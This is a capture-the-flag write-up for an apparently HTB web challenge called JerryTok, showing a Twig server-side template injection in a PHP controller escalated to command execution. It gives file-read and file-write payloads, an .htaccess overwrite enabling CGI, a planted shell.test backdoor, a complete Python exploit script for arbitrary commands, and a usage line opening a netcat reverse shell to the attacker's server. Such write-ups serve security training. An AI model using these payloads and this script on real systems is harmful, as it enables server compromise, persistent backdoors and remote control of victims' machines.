# Challenge: JerryTok
## Rate: Medium

Analyzing the source code:

- `DefaultController.php`
    
    ```bash
    <?php
    ...
    
            $location = $request->get('location');
    
    ...
            
            $message = $this->container->get('twig')->createTemplate(
                    "Located at: {$location} from your ship's computer"
                )
                ->render();
    ...
    ```
    

Simple SSTI - `http://<Challenge_URL>?location={{7*7}}`

```php
{{7*7}}
```

- Disabled Functions:
    
    ```bash
    echo "disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create, mail" >> /etc/php82/conf.d/disablefns.ini
    ```
    

We can use `file_get_contents` and `file_put_contents` functions to bypass these limitations.

File Read:

```php
{{['file:///www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}
```

Binary File Read:

```php
{{['php://filter/convert.base64-encode/resource=/www/src/Controller/DefaultController.php']|map('file_get_contents')|join}}
```

PHP Info Write:

```php
{{['/www/public/info.php',"<?php phpinfo();"]|sort('file_put_contents')}}
```

Since we have limited by `open_basedir` to only access to `/www` directory, we have to get rid of it by overwriting it with `.htaccess`.

```bash
echo "open_basedir = /www" >> /etc/php82/conf.d/openbdir.ini
```

Overwrite `.htaccess` and add an exception for CGI files to bypass `open_basedir` limitation:

```bash
Options  ExecCGI
AddHandler cgi-script .test
```

```bash
%7B%7B%5B'/www/public/.htaccess',%22Options%20+ExecCGI%0AAddHandler%20cgi-script%20.test%0A%22%5D%7Csort('file_put_contents')%7D%7D

{{['/www/public/.htaccess',"Options%20+ExecCGI%0AAddHandler%20cgi-script%20.test%0A"]|sort('file_put_contents')}}
```

Create `shell.test`

```bash
#!/bin/sh\necho&&echo ID:;id;echo FLAG;/readflag
```

```php
{{['/www/public/shell.test',"%23%21%2Fbin%2Fsh%5Cnecho%26%26echo%20ID%3A%3Bid%3Becho%20FLAG%3B%2Freadflag%0A"]|sort('file_put_contents')}}
```

`Chmod 551 shell.test`

```php
{{['/www/public/shell.test',511]|sort('chmod')}}
```

Call CGI

```bash
curl http://127.0.0.1/shell.test
```

Exploit:

```python
import requests
import urllib.parse
import argparse

def exploit_ssti(payload):
    ssti_url = f"{url}?location={payload}"
    return requests.get(ssti_url)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                prog='mb_send_mail_xpl',
                description='Exploit solution for HTB challenge JerryTok')
    parser.add_argument('-u', '--url', default='http://127.0.0.1:1337', help='Target URL.')
    parser.add_argument('-c', '--command', default='id', help='Command to execute on target.')
    args = parser.parse_args()
    url = args.url
    command = args.command

    htaccess = """Options +ExecCGI\nAddHandler cgi-script .test\n"""
    payload = f"{{{{['/www/public/.htaccess','{htaccess}']|sort('file_put_contents')}}}}"
    exploit_ssti(payload)

    cgi_backdoor = urllib.parse.quote(f"#!/bin/sh\n\necho&&{command}")
    payload = f"{{{{['/www/public/shell.test','{cgi_backdoor}']|sort('file_put_contents')}}}}"
    exploit_ssti(payload)

    payload = "{{['/www/public/shell.test',511]|sort('chmod')}}"
    exploit_ssti(payload)

    response = requests.get(f"{url}/shell.test")
    print(response.text)
```

```bash
python3 exploit-jerryTok.py --url http://<challenge_ip>:<challenge_port> --command "nc <your_server_ip> 1234 -e /bin/sh"
```

![image](./image/flag.png)
